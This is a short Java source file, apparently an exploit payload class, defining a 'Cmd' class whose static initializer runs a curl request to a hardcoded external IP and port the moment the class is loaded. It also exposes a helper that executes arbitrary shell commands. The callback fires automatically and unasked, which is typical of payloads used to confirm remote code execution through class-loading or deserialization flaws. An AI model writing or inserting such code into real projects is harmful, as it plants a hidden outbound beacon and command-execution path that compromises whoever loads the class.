import java.io.IOException;

public class Cmd {

    static {
        try {
            Runtime.getRuntime().exec("/usr/bin/curl 139.199.203.253:1234");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }

}